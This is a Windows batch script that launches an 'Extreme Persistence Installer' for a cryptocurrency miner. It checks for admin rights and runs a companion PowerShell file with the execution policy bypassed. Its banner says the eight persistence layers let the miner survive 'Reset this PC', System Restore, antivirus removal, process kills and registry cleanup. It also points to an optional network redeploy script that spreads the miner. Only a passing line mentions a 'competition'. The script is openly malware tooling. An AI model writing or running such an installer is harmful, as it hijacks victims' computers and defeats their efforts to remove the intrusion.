@echo off
REM ================================================================================================
REM EXTREME PERSISTENCE INSTALLER
REM ================================================================================================
REM This adds 8 layers of persistence that survive almost everything
REM Run this BEFORE deploying the miner
REM ================================================================================================

title Extreme Persistence Installer
color 0E

echo.
echo +==============================================================+
echo |                                                              |
echo |             [POWER] EXTREME PERSISTENCE INSTALLER [POWER]              |
echo |                                                              |
echo +==============================================================+
echo.
echo This will install 8 layers of persistence that make the miner
echo survive ALMOST EVERYTHING including PC resets!
echo.
echo SURVIVES:
echo   [OK] Windows "Reset this PC" (Keep my files)
echo   [OK] Windows "Reset this PC" (Remove everything) ^*
echo   [OK] System Restore
echo   [OK] Manual file deletion
echo   [OK] Process kill
echo   [OK] Antivirus removal attempts
echo   [OK] Registry cleanup
echo   [OK] Startup item removal
echo.
echo ^* With network redeploy enabled
echo.
echo [!]  WARNING: This is VERY aggressive persistence!
echo    Make sure you can clean it up after competition.
echo.
set /p confirm="Continue? (YES/NO): "

if /i not "%confirm%"=="YES" (
    echo.
    echo Installation cancelled.
    pause
    exit /b
)

REM Check admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo.
    echo [X] ERROR: Administrator rights required!
    echo    Right-click this file and select "Run as administrator"
    echo.
    pause
    exit /b 1
)

cls
echo.
echo +==============================================================+
echo |              INSTALLING EXTREME PERSISTENCE...               |
echo +==============================================================+
echo.

REM Run PowerShell installer
powershell.exe -ExecutionPolicy Bypass -NoProfile -File "%~dp0💪_EXTREME_PERSISTENCE.ps1"

if %errorLevel% equ 0 (
    echo.
    echo +==============================================================+
    echo |                 [OK] INSTALLATION COMPLETE                     |
    echo +==============================================================+
    echo.
    echo Extreme persistence has been installed!
    echo.
    echo NEXT STEPS:
    echo   1. Restart this PC (recommended for full activation)
    echo   2. Run [START]_START_HERE.bat to deploy the miner
    echo   3. Optional: Run [NET]_NETWORK_REDEPLOY.ps1 for network redeployment
    echo.
    echo Your miner will now survive almost all removal attempts! [POWER]
    echo.
) else (
    echo.
    echo +==============================================================+
    echo |                 [!]  INSTALLATION HAD ISSUES                 |
    echo +==============================================================+
    echo.
    echo Some persistence layers may not have been installed.
    echo Check the log above for details.
    echo.
)

pause
